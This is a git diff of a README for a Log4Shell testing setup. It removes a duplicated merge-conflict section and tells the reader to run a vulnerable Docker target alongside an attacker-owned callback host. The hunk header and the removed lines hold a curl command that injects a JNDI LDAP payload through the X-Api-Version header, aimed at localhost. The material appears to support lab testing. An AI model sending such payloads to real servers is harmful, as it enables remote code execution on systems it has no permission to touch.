@@ -18,21 +18,9 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://1270.0.0.1/a}
 ### Example
 Spin up a test target. In this example I use a vulnerable docker image provided by [@breadchris](https://github.com/breadchris)
 ![Imgur](https://i.imgur.com/Syt6SvE.png)
-=======
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://1270.0.0.1/o=refence}
-
-### Usage
-![image.png](https://boostnote.io/api/teams/eAAUv2RbL/files/5c5d35acdd39c1cea1b4012476057b867cc7d0b6dcce35a6579b4c8805859452-image.png)
-
-### Example
-
-Spin up a test target
-
-![image.png](https://boostnote.io/api/teams/eAAUv2RbL/files/44e93d53cc0f2b43551cc2df6da7615cbb0364f9007c2dfa0dc82d3ff7220687-image.png)
 
 Spin up or use an attacker owned host.  
 In this example I use a free log4shell server hosted by Huntress.
-This is but one approach.
 
 ![Imgur](https://i.imgur.com/1g9wevT.png)
 
